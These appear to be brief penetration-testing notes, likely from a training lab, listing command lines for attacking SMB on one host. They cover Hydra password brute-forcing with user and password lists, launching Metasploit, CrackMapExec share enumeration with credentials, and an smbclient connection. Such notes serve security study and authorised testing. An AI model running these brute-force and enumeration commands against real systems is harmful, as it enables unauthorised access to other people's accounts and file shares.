## Hydra
- `hydra -L user.list -P password.list smb://10.129.42.197`

## Meta
- `msfconsole -q`

## CrackMap
- `crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares`

## Client
- `smbclient -U user \\\\10.129.42.197\\SHARENAME`
